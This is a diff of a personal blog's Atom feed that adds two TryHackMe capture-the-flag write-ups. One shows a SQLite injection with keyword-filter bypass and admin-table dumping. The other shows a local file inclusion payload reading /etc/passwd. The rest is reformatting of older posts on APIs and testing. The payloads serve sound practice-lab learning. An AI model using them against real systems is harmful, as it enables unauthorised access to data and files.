@@ -2,9 +2,116 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <title>it on aviskase</title>
   <id>https://www.aviskase.com/</id>
-  <updated>2024-11-28T04:30:28Z</updated>
+  <updated>2025-02-05T19:03:58Z</updated>
   <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/categories/it/feeds/all.atom.xml" hreflang="en"/>
   <link rel="alternate" type="text/html" href="https://www.aviskase.com/categories/it/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe Light</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/05/writeup-tryhackme-light/" hreflang="en"/>
+    <published>2025-02-05T19:03:58Z</published>
+    <updated>2025-02-05T19:03:58Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-05:/articles/2025/02/05/writeup-tryhackme-light/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: db</li>
+</ul>
+<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: db</li>
+</ul>
+<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>
+</div>
+<p>Connect to the machine and try invalid and valid usernames:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc MACHINE_IP <span style="color:#fab387">1337</span>
+</span></span><span style="display:flex;"><span>Welcome to the Light database!
+</span></span><span style="display:flex;"><span>Please enter your username: blah
+</span></span><span style="display:flex;"><span>Username not found.
+</span></span><span style="display:flex;"><span>Please enter your username: smokey
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span></code></pre></div><p>Try a quote to check for injection vulnerabilities:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;
+</span></span><span style="display:flex;"><span>Error: unrecognized token: &#34;&#39;smokey&#39;&#39; LIMIT 30&#34;
+</span></span></code></pre></div><p>Good, we&rsquo;re dealing with the database. Let&rsquo;s break out of the error with a comment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;--
+</span></span><span style="display:flex;"><span>For strange reasons I can&#39;t explain, any input containing /*, -- or, %0b is not allowed :)
+</span></span></code></pre></div><p>Ok, no comments. We can do it differently:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span></code></pre></div><div class="callout note">
+    <p>After finishing the room I learned that you can do <code>smokey' '</code> to create a <a href="https://www.w3schools.com/sql/sql_alias.asp" class="external-link">SQL alias</a> with the same result.</p>
+</div>
+<p>So, there is some filtering here. And it also checks keywords:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: &#39; UNION 
+</span></span><span style="display:flex;"><span>Ahh there is a word in there I don&#39;t like :(
+</span></span></code></pre></div><p>At this point I guessed that room&rsquo;s name hinted at SQLite database. Using this <a href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf" class="external-link">SQLite explotaition paper</a> as a reference, let&rsquo;s enumerate tables and their structures. To escape keyword filtering we can use random letter cases.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39; UnioN Select group_concat(tbl_name) FRoM sqlite_master WhEre type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: usertable,admintable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;usertable&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: CREATE TABLE usertable (
+</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>                   username TEXT,
+</span></span><span style="display:flex;"><span>                   password INTEGER)
+</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;admintable&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: CREATE TABLE admintable (
+</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>                   username TEXT,
+</span></span><span style="display:flex;"><span>                   password INTEGER)
+</span></span></code></pre></div><p>We&rsquo;re ready to get flags. First flag: admin username.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT group_concat(username) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39; 
+</span></span><span style="display:flex;"><span>Password: REDACTED,flag
+</span></span></code></pre></div><p>Second and third flags: admin passwords and flag value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username:-1&#39;  UnIon SeLeCT group_concat(password) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
+</span></span><span style="display:flex;"><span>Password: REDACTED,REDACTED
+</span></span></code></pre></div><p>Or, to get a full table with all flags at once:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT GROUP_CONCAT(username || &#39; &#39; || password, &#39;, &#39;) AS combined FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
+</span></span><span style="display:flex;"><span>Password: REDACTED REDACTED, flag REDACTED
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Lo-Fi</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/03/writeup-tryhackme-lo-fi/" hreflang="en"/>
+    <published>2025-02-03T17:12:54Z</published>
+    <updated>2025-02-03T17:12:54Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-03:/articles/2025/02/03/writeup-tryhackme-lo-fi/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info"><ul>
+<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
+Check out similar content on TryHackMe:</p>
+<ul>
+<li>LFI Path Traversal</li>
+<li>File Inclusion</li>
+</ul></div>
+<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
+<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info"><ul>
+<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
+Check out similar content on TryHackMe:</p>
+<ul>
+<li>LFI Path Traversal</li>
+<li>File Inclusion</li>
+</ul></div>
+<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
+<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>
+<p>Attempt to get LFI <code>http://MACHINE_IP/?page=../../../etc/passwd</code> is working.</p>
+<p>Let&rsquo;s try to find a flag. I just stompted up in the directory hierarchy: <code>http://MACHINE_IP/?page=../../../flag.txt</code>. Success: <code>flag{REDACTED}</code>!</p>
+<p>Even though it is a very simple room, I still checked other writeups. And it was a good idea because here you can read about <a href="https://jaxafed.github.io/posts/tryhackme-lo-fi/#extra---rce" class="external-link">how to escalate LFI to RCE</a>.</p>
+]]></content>
+  </entry>
   <entry>
     <title>The second (and probably last this year) progress report on cyber learning</title>
     <link rel="alternate" href="https://www.aviskase.com/articles/2024/11/27/the-second-and-probably-last-this-year-progress-report-on-cyber-learning/" hreflang="en"/>
@@ -140,24 +247,35 @@
     <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2024-01-26:/articles/2024/01/25/open-banking-canada-vs-kazakhstan/</id>
     
     <summary type="html"><![CDATA[<p>As I was skimming through <a href="https://apichangelog.substack.com/p/2024-04" class="external-link">The API Changelog issue 2024.04</a>, my eye caught:</p>
+
 <blockquote>
-<p>Kazakhstan&rsquo;s National Bank and other entities <a href="https://astanatimes.com/2024/01/kazakhstan-joins-open-banking-countries-produces-initial-results/" class="external-link">published</a> a report on an Open API and Open Banking pilot, aiming to modernize financial services through standardized data exchange. The successful pilot involved multiple banks and clients, setting the stage for a transparent and competitive financial sector by 2024.</p>]]></summary>
+    <p>Kazakhstan&rsquo;s National Bank and other entities <a href="https://astanatimes.com/2024/01/kazakhstan-joins-open-banking-countries-produces-initial-results/" class="external-link">published</a> a report on an Open API and Open Banking pilot, aiming to modernize financial services through standardized data exchange. The successful pilot involved multiple banks and clients, setting the stage for a transparent and competitive financial sector by 2024.</p>]]></summary>
     <content type="html"><![CDATA[<p>As I was skimming through <a href="https://apichangelog.substack.com/p/2024-04" class="external-link">The API Changelog issue 2024.04</a>, my eye caught:</p>
+
 <blockquote>
-<p>Kazakhstan&rsquo;s National Bank and other entities <a href="https://astanatimes.com/2024/01/kazakhstan-joins-open-banking-countries-produces-initial-results/" class="external-link">published</a> a report on an Open API and Open Banking pilot, aiming to modernize financial services through standardized data exchange. The successful pilot involved multiple banks and clients, setting the stage for a transparent and competitive financial sector by 2024.</p></blockquote>
+    <p>Kazakhstan&rsquo;s National Bank and other entities <a href="https://astanatimes.com/2024/01/kazakhstan-joins-open-banking-countries-produces-initial-results/" class="external-link">published</a> a report on an Open API and Open Banking pilot, aiming to modernize financial services through standardized data exchange. The successful pilot involved multiple banks and clients, setting the stage for a transparent and competitive financial sector by 2024.</p>
+</blockquote>
 <p>Cool. Let&rsquo;s read the report.</p>
+
 <blockquote>
-<p>The pilot project was carried out with the participation of focus groups of 128 clients and second-tier banks, including Bank RBK, Altyn Bank, Home Credit Bank, Bank CenterCredit, and Otbasy Bank.</p></blockquote>
+    <p>The pilot project was carried out with the participation of focus groups of 128 clients and second-tier banks, including Bank RBK, Altyn Bank, Home Credit Bank, Bank CenterCredit, and Otbasy Bank.</p>
+</blockquote>
+
 <blockquote>
-<p>The country now follows the concept of development of Open API and Open Banking for 2023-2025, which was approved by the National Bank of Kazakhstan, the Agency for Regulation and Development of Financial Market, and the Agency for Protection and Development of Competition in December 2022.</p></blockquote>
+    <p>The country now follows the concept of development of Open API and Open Banking for 2023-2025, which was approved by the National Bank of Kazakhstan, the Agency for Regulation and Development of Financial Market, and the Agency for Protection and Development of Competition in December 2022.</p>
+</blockquote>
 <p>Yup, Halyk Bank isn&rsquo;t mentioned, so it&rsquo;s just a really early pilot. Even more, no Kaspi Bank. It&rsquo;s like doing something in Canada without involving <a href="https://en.wikipedia.org/wiki/Big_Five_banks_of_Canada" class="external-link">Big Five</a>. Well, they have 2 more years, so, good luck.</p>
 <p>Hmm. Speaking of. What about Canada?</p>
 <p>Despite Canada&rsquo;s reputation for bad information disclosure approaches, I do enjoy the content available on <code>canada.ca</code>. Including <a href="https://www.canada.ca/en/financial-consumer-agency/services/banking/open-banking.html" class="external-link">what&rsquo;s up with open banking</a>. It&rsquo;s a long page, but all you need is the first sentence:</p>
+
 <blockquote>
-<p>Open banking, also called consumer-driven banking, is not yet available in Canada.</p></blockquote>
+    <p>Open banking, also called consumer-driven banking, is not yet available in Canada.</p>
+</blockquote>
 <p>Ouch. Is there any progress, though? According to <a href="https://www.canada.ca/en/department-finance/programs/financial-sector-policy/open-banking-implementation/2023-fes-policy-statement-consumer-driven-banking.html" class="external-link">2023 Fall Economic Statement: Policy Statement on Consumer-Driven Banking</a>:</p>
+
 <blockquote>
-<p>The Department of Finance will advance the work required to stand up a Canadian framework governing consumer-driven banking, with the goal of adopting legislation and fully implementing the necessary governance framework by 2025.</p></blockquote>
+    <p>The Department of Finance will advance the work required to stand up a Canadian framework governing consumer-driven banking, with the goal of adopting legislation and fully implementing the necessary governance framework by 2025.</p>
+</blockquote>
 <p>Same year, different goals. Kazakhstan is planning to finish implementing (doubt it), whereas Canada is planning to finish with laws and paperwork (doubt it too). Let&rsquo;s put a reminder and check on them both in 2025?</p>
 ]]></content>
   </entry>
@@ -169,13 +287,16 @@
     <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2023-12-15:/articles/2023/12/15/the-navys-it-challenges/</id>
     
     <summary type="html"><![CDATA[<p>Can&rsquo;t stop thinking about one line from the recent <a href="https://paulwells.substack.com/p/a-generational-challenge-in-naval" class="external-link">Paul Well&rsquo;s interview with Vice Admiral Angus Topshee</a>, the Commander of the Royal Canadian Navy.</p>
+
 <blockquote>
-<p>PW: Is the fact that this video’s on YouTube a reflection of any difficulty you&rsquo;re having getting heard internally?</p>
+    <p>PW: Is the fact that this video’s on YouTube a reflection of any difficulty you&rsquo;re having getting heard internally?</p>
 <p>AT: No. I&rsquo;ve shared my assessments with the leadership of the Department, up to and including this minister and the previous Minister. I feel I&rsquo;m being heard and respected. This was more about, we wanted to put the message out internally. Unfortunately, there&rsquo;s some very specific IT challenges around how we disseminate internal messages. And so [Youtube] was the channel we used.</p>]]></summary>
     <content type="html"><![CDATA[<p>Can&rsquo;t stop thinking about one line from the recent <a href="https://paulwells.substack.com/p/a-generational-challenge-in-naval" class="external-link">Paul Well&rsquo;s interview with Vice Admiral Angus Topshee</a>, the Commander of the Royal Canadian Navy.</p>
+
 <blockquote>
-<p>PW: Is the fact that this video’s on YouTube a reflection of any difficulty you&rsquo;re having getting heard internally?</p>
-<p>AT: No. I&rsquo;ve shared my assessments with the leadership of the Department, up to and including this minister and the previous Minister. I feel I&rsquo;m being heard and respected. This was more about, we wanted to put the message out internally. Unfortunately, there&rsquo;s some very specific IT challenges around how we disseminate internal messages. And so [Youtube] was the channel we used.</p></blockquote>
+    <p>PW: Is the fact that this video’s on YouTube a reflection of any difficulty you&rsquo;re having getting heard internally?</p>
+<p>AT: No. I&rsquo;ve shared my assessments with the leadership of the Department, up to and including this minister and the previous Minister. I feel I&rsquo;m being heard and respected. This was more about, we wanted to put the message out internally. Unfortunately, there&rsquo;s some very specific IT challenges around how we disseminate internal messages. And so [Youtube] was the channel we used.</p>
+</blockquote>
 <p><em>Specific IT challenges</em>, eh?</p>
 <p>I guess most of the people skim through this line. Whatever, it&rsquo;s just a pretext. But for me it sounds bizarrely specific. So, here some of my musings about it.</p>
 <p>Those problems with internal communications. It got me curious, how really it&rsquo;s even done in the military. &ldquo;Army-wide&rdquo; emails? Slack, Zoom, Teams? IRC? The answer is <a href="https://www.reddit.com/r/CanadianForces/comments/11hy76u/scs_whaaaatsappp/" class="external-link">all of these</a>. Total chaos. I especially like the comment mentioning using Facebook Messenger, because, c&rsquo;mon! At least, no WeChat. I hope. I also hope they have less problems accessing their Top Secret Network stuff, <a href="https://www.canada.ca/content/dam/di-id/documents/rpt/rapporteur/Independent-Special-Rapporteur%20-Report-eng.pdf" class="external-link">not like our ministers [page 27]</a>.</p>
@@ -841,8 +962,10 @@ To preview a specific definition, you need to pass a definition label from confi
 </h3>
 <p>Read <a href="https://stoplight.io/blog/is-api-planning-the-same-thing-as-api-design/" class="external-link">this article for more details</a>. Here is a TL;DR.</p>
 <p><strong>API-first</strong> is about how you approach your API as a product: not an afterthought on top of already created system, but thought through right from the start. The good example came recently from <a href="https://obsidian.md/" class="external-link">Obsidian&rsquo;s devs</a>:</p>
+
 <blockquote>
-<p>For the developer the biggest issue is migrating an existing app that wasn&rsquo;t designed with plugin/API in mind. Having experienced this first hand with our previous product, we designed Obsidian from the ground up with a plugin API from the first version.</p></blockquote>
+    <p>For the developer the biggest issue is migrating an existing app that wasn&rsquo;t designed with plugin/API in mind. Having experienced this first hand with our previous product, we designed Obsidian from the ground up with a plugin API from the first version.</p>
+</blockquote>
 <p><strong>API design-first</strong> means prototyping and testing a design before any coding is started. <strong>API code-first</strong> (or implementation-first) means having some code written even at the the design stage. Often though, a more restricted definition is used and it&rsquo;s about the source of truth: description doc or code.</p>
 <ul>
 <li>Design-first: &ldquo;we write description doc first and then implement&rdquo;.</li>
@@ -914,12 +1037,18 @@ To preview a specific definition, you need to pass a definition label from confi
 <p><a href="https://www.youtube.com/playlist?list=PLBitIgZ_UvGFNHPFlRg4834gYBmbYmdr7" class="external-link">Watch this playlist</a> (3 videos at the time of writing). You may think &ldquo;wtf, Yuliya, this is some bullshit video game essays&rdquo;. Yes, it is.</p>
 <p>But it is also one of the best videos explaining modern testing principles, agile, and lean. Damn, this could be on par with some TED talks. It also explains the appeal of APIs: modding in games is the similar concept to publishing APIs; you never know what users come up with.</p>
 <p>How about some quotes:</p>
+
 <blockquote>
-<p>Early access is your <em>release</em>.</p></blockquote>
+    <p>Early access is your <em>release</em>.</p>
+</blockquote>
+
 <blockquote>
-<p>With <em>rapid iterations</em> DayZ mod evolved as the features were added based on <em>what people wanted</em> rather than what developer and publisher thought people wanted.</p></blockquote>
+    <p>With <em>rapid iterations</em> DayZ mod evolved as the features were added based on <em>what people wanted</em> rather than what developer and publisher thought people wanted.</p>
+</blockquote>
+
 <blockquote>
-<p>[&hellip;] design pressure from the bottom up.</p></blockquote>
+    <p>[&hellip;] design pressure from the bottom up.</p>
+</blockquote>
 <p>And, I don&rsquo;t want to spoil it, but the juiciest part comes later with one of the best case studies for business owners: how to ignore the lucrative niche created for you by your players/users and lose the opportunity to grab the market. By lucrative I mean&hellip; even those who don&rsquo;t play games know the biggest game in that genre ;)</p>
 <p>
 <img class="" src="/articles/2020/11/30/hmms-november/floss.gif" alt="Floss dance" >
@@ -1302,17 +1431,20 @@ To preview a specific definition, you need to pass a definition label from confi
     <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2020-08-08:/articles/2020/08/08/be-chicken/</id>
     
     <summary type="html"><![CDATA[<p><a href="https://www.apiscene.io/lifecycle/changing-culture-how-committed-are-you/" class="external-link">The article on API change culture</a> uses a well-known &ldquo;the chicken and the pig&rdquo; fable as an inspiration:</p>
+
 <blockquote>
-<p>A Pig and a Chicken are walking down the road.</p>
+    <p>A Pig and a Chicken are walking down the road.</p>
 <p>The Chicken says: &ldquo;Hey Pig, I was thinking we should open a restaurant!&rdquo;</p>
 <p>Pig replies: &ldquo;Hm, maybe, what would we call it?&rdquo;</p>]]></summary>
     <content type="html"><![CDATA[<p><a href="https://www.apiscene.io/lifecycle/changing-culture-how-committed-are-you/" class="external-link">The article on API change culture</a> uses a well-known &ldquo;the chicken and the pig&rdquo; fable as an inspiration:</p>
+
 <blockquote>
-<p>A Pig and a Chicken are walking down the road.</p>
+    <p>A Pig and a Chicken are walking down the road.</p>
 <p>The Chicken says: &ldquo;Hey Pig, I was thinking we should open a restaurant!&rdquo;</p>
 <p>Pig replies: &ldquo;Hm, maybe, what would we call it?&rdquo;</p>
 <p>The Chicken responds: &ldquo;How about &lsquo;ham-n-eggs&rsquo;?&rdquo;</p>
-<p>The Pig thinks for a moment and says: &ldquo;No thanks. I&rsquo;d be committed, but you&rsquo;d only be involved.&rdquo;</p></blockquote>
+<p>The Pig thinks for a moment and says: &ldquo;No thanks. I&rsquo;d be committed, but you&rsquo;d only be involved.&rdquo;</p>
+</blockquote>
 <p>I bet I won&rsquo;t say anything new or profound, but it always weirds me out that the pig is considered somewhat more important than the chicken. Oh, right, because <em>it must die</em> to be useful.</p>
 <p>Well, I grew up in the 90s in Kazakhstan. Like many people we were relying on our village relatives for food, so ham and egg production is not an elegant metaphor but a real-life experience for me.</p>
 <p>Growing pigs is a <em>slow process</em> with a big <em>one-time payoff</em>. It&rsquo;s not free: you need to feed them and clean the place.  And you&rsquo;d better have a pair of pigs so that the production could be at least somewhat renewable. One committed pig is a splendid feast in the short term and hunger in the long term. Don&rsquo;t forget an emotional cost: pigs don&rsquo;t die by themselves. You will hear it. You will <em>smell</em> it.</p>
@@ -1501,8 +1633,10 @@ To preview a specific definition, you need to pass a definition label from confi
 <li><code>&quot;tugrik&quot;: &quot;blah&quot;</code> fails</li>
 </ul>
 <p>Can you guess how <em>really robust</em> validators are different? Right! They make <code>&quot;tugrik&quot;: &quot;10&quot;</code> to pass validation. Because they follow Postel&rsquo;s law:</p>
+
 <blockquote>
-<p>Be conservative in what you send, be liberal in what you accept.</p></blockquote>
+    <p>Be conservative in what you send, be liberal in what you accept.</p>
+</blockquote>
 <p>While this statement is way more complex than puny little tester&rsquo;s blog could handle, it&rsquo;s important to know its existence and application.  Following Postel&rsquo;s law to any degree is <em>a design choice.</em></p>
 <p>If your service is designed to handle weak input like <code>&quot;tugrik&quot;: &quot;10&quot;</code> as a valid number, it&rsquo;s not a bug. If you send additional properties in the request and a service ignores them without throwing 4xx error, it&rsquo;s not a bug either. It can be very well a feature.</p>
 <p>And yes, there is definitely a way <a href="https://techblog.workiva.com/tech-blog/wrestling-postel%E2%80%99s-law" class="external-link">to do robustness wrong or overdo it</a>. If you write a browser engine from scratch (why?), you&rsquo;ll follow Postel&rsquo;s law religiously. Another reason would be ensuring the maximum uptime of API clients. More successful requests they do and less work is required from them to connect to your product result in more profit.</p>
@@ -1828,8 +1962,9 @@ don&rsquo;t try to turn it into a complex automation solution. That&rsquo;s what
 and <a href="https://www.youtube.com/watch?v=qc_DF01qgZg" class="external-link">the last one</a> covers pros and cons of exposing system APIs.</li>
 <li>Tyk explains <a href="https://tyk.io/considerations-before-building-your-own-api-gateway/" class="external-link">why you shouldn&rsquo;t write our own API gateway</a>. I particularly liked this part:</li>
 </ul>
+
 <blockquote>
-<p>Another chose to build their own API gateway because no offerings existed that would operate in their
+    <p>Another chose to build their own API gateway because no offerings existed that would operate in their
 preferred Windows-based server environment.
 I haven’t heard from them since as they still haven’t shipped their product &mdash; a full year later.</p>]]></summary>
     <content type="html"><![CDATA[<p>Coronavirus-free edition!</p>
@@ -1851,10 +1986,12 @@ I haven’t heard from them since as they still haven’t shipped their product 
 and <a href="https://www.youtube.com/watch?v=qc_DF01qgZg" class="external-link">the last one</a> covers pros and cons of exposing system APIs.</li>
 <li>Tyk explains <a href="https://tyk.io/considerations-before-building-your-own-api-gateway/" class="external-link">why you shouldn&rsquo;t write our own API gateway</a>. I particularly liked this part:</li>
 </ul>
+
 <blockquote>
-<p>Another chose to build their own API gateway because no offerings existed that would operate in their
+    <p>Another chose to build their own API gateway because no offerings existed that would operate in their
 preferred Windows-based server environment.
-I haven’t heard from them since as they still haven’t shipped their product &mdash; a full year later.</p></blockquote>
+I haven’t heard from them since as they still haven’t shipped their product &mdash; a full year later.</p>
+</blockquote>
 <ul>
 <li>Adidas has awesome API guidelines and recently they&rsquo;ve published <a href="https://github.com/adidas/api-pm-training" class="external-link">their API training for PMs</a>. If they ever decide to offer public trainings, I would love to participate: some of the modules are a bit too
 business-y for me to comprehend without hands-on experience.</li>
@@ -2347,8 +2484,9 @@ Even though I never played Skyrim or Morrowind, TES wiki is an awesome read for 
 <p>A fun <a href="https://queue.acm.org/detail.cfm?ref=rss&amp;id=3375635" class="external-link">article from ACM Queue magazine</a> about how to alienate
 customers from using your API. I like an <a href="https://www.aviskase.com/articles/2019/09/02/your-api-is-your-public-image/" class="external-link">&ldquo;anti-tutorial&rdquo; form</a>,
 it is easier to recall bad patterns and behaviors.</p>
+
 <blockquote>
-<p>One such form I filled out required me to describe the application I planned to write. &lt;&hellip;&gt;
+    <p>One such form I filled out required me to describe the application I planned to write. &lt;&hellip;&gt;
 Sadly, I didn&rsquo;t have a particular application in mind. I was going to explore the API and write a few simple
 Python-based utilities to automate some daily tasks. I didn&rsquo;t want to explain all that, however, for fear that
 my answer would not be good enough for whoever was judging my application.
@@ -2361,18 +2499,22 @@ but as a precaution my code editor has been themed in dark purple with white hig
 <p>A fun <a href="https://queue.acm.org/detail.cfm?ref=rss&amp;id=3375635" class="external-link">article from ACM Queue magazine</a> about how to alienate
 customers from using your API. I like an <a href="https://www.aviskase.com/articles/2019/09/02/your-api-is-your-public-image/" class="external-link">&ldquo;anti-tutorial&rdquo; form</a>,
 it is easier to recall bad patterns and behaviors.</p>
+
 <blockquote>
-<p>One such form I filled out required me to describe the application I planned to write. &lt;&hellip;&gt;
+    <p>One such form I filled out required me to describe the application I planned to write. &lt;&hellip;&gt;
 Sadly, I didn&rsquo;t have a particular application in mind. I was going to explore the API and write a few simple
 Python-based utilities to automate some daily tasks. I didn&rsquo;t want to explain all that, however, for fear that
 my answer would not be good enough for whoever was judging my application.
 In a panic, I simply described my application as &ldquo;dark purple with white highlights.&rdquo;
 A few weeks later my application was approved. So far, I haven&rsquo;t been visited by any auditor SWAT teams,
-but as a precaution my code editor has been themed in dark purple with white highlights ever since.</p></blockquote>
+but as a precaution my code editor has been themed in dark purple with white highlights ever since.</p>
+</blockquote>
 <p>This particular quote hit hard:</p>
+
 <blockquote>
-<p>Nothing says &ldquo;we don&rsquo;t actually want you to use our API&rdquo; like making your API documentation invisible
-to search engines. The &ldquo;build, run, debug&rdquo; cycle of decades ago has been replaced by &ldquo;run, crash, Google, fix.&rdquo;</p></blockquote>
+    <p>Nothing says &ldquo;we don&rsquo;t actually want you to use our API&rdquo; like making your API documentation invisible
+to search engines. The &ldquo;build, run, debug&rdquo; cycle of decades ago has been replaced by &ldquo;run, crash, Google, fix.&rdquo;</p>
+</blockquote>
 <p>Once we tried to research our competitors and we couldn&rsquo;t find even screenshots. How the hell
 a potential customer is supposed to evaluate your product if you hide <strong>everything</strong>?</p>
 <h2 id="yegor-bugaenko-on-qa-vs-testing" >
@@ -2471,8 +2613,10 @@ probably never consider how it affects existing canon.</p>
 <p>I&rsquo;m not a saint either. I rant, joke, correct, discuss, persuade, and roll my eyes. Maybe it comes with the profession. Or it&rsquo;s a normal thing for any community. What amazes me, that this much concentration of disagreements exists around the pettiest and smallish topics. Sometimes people even talk about the same ideas but with different examples, and it results in confrontations (direct or indirect).</p>
 <p>Giving recent cases wouldn&rsquo;t be humanly correct in regard to individuals involved. Let&rsquo;s just say: I participate in several slack workspaces. And it&rsquo;s quite common to a discussion in one to provoke posts in others with opposite reactions like &ldquo;good work&rdquo; and &ldquo;it drives me insane.&rdquo;</p>
 <p>Though, I want to quote one:</p>
+
 <blockquote>
-<p>Testing vs Checking is like Russian revolution &mdash; senseless and merciless.</p></blockquote>
+    <p>Testing vs Checking is like Russian revolution &mdash; senseless and merciless.</p>
+</blockquote>
 <p>You can replace &ldquo;testing vs checking&rdquo; with whatever you want, and it will hold true to a lot of prevalent discussions.</p>
 <h2 id="laptops--linux" >
   <a href="#laptops--linux">Laptops &amp; Linux</a>
@@ -2532,8 +2676,9 @@ probably never consider how it affects existing canon.</p>
 <li><a href="https://www.youtube.com/watch?v=qCdpTji8nxo" class="external-link">Kevin Lacker: How to Design Great APIs</a></li>
 </ul>
 <p>The second one has a nice quotable passage:</p>
+
 <blockquote>
-<p>A good API will let you be lazy.</p>
+    <p>A good API will let you be lazy.</p>
 <p>A great API will empower you to be <em>really lazy</em>.</p>]]></summary>
     <content type="html"><![CDATA[<h2 id="watching" >
   <a href="#watching">Watching</a>
@@ -2544,9 +2689,11 @@ probably never consider how it affects existing canon.</p>
 <li><a href="https://www.youtube.com/watch?v=qCdpTji8nxo" class="external-link">Kevin Lacker: How to Design Great APIs</a></li>
 </ul>
 <p>The second one has a nice quotable passage:</p>
+
 <blockquote>
-<p>A good API will let you be lazy.</p>
-<p>A great API will empower you to be <em>really lazy</em>.</p></blockquote>
+    <p>A good API will let you be lazy.</p>
+<p>A great API will empower you to be <em>really lazy</em>.</p>
+</blockquote>
 <h2 id="reading" >
   <a href="#reading">Reading</a>
 </h2>
@@ -2759,8 +2906,10 @@ probably never consider how it affects existing canon.</p>
   <a href="#read-the-damn-code">Read the damn code</a>
 </h2>
 <p>This week testing slack group had an almost holy war about testers looking at code. The consensus seemed to be &ldquo;access to code is awesome,&rdquo; nevertheless, there were other opinions:</p>
+
